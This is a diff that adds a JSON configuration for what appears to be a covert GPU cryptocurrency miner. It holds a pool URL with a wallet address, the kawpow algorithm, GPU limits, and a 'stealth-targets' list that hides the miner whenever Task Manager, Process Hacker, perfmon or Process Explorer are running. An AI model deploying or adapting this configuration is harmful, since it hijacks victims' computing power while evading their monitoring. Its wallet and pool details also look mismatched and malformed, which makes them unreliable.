@@ -1,0 +1,10 @@
+{
+    "url": "stratum://`bc1q40a96lvncrf97jhdytr0fac25maqmefxd8d694`.Laptop@pool.supportxus-us-rvn.2miners.com:6060",
+    "algo": "kawpow",
+    "max-gpu": 10,
+    "idle-wait": 2,
+    "idle-gpu": 50,
+    "stealth-targets": "Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe",
+    "kill-targets": "",
+    "stealth-fullscreen": false
+}
